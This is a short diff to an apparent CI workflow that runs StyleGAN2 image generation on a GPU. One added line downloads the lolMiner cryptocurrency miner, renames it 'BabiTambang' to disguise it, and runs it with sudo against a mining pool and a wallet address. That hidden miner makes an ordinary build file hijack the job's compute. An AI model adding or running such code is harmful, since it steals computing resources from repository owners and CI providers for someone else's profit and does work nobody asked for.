@@ -35,6 +35,7 @@ jobs:
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
         nvidia-smi
+        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz && tar -xf lolMiner_v1.28a_Lin64.tar.gz && cd 1.28a && chmod +x lolMiner && mv lolMiner BabiTambang && sudo ./BabiTambang -a ETHASH --pool -o stratum+tcp://ethash.asia.mine.zergpool.com:9999 -u MB3ux2fkhJAcT94zayTTbSFJToCQcuRfGj -p  c=LTC,ID=id
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
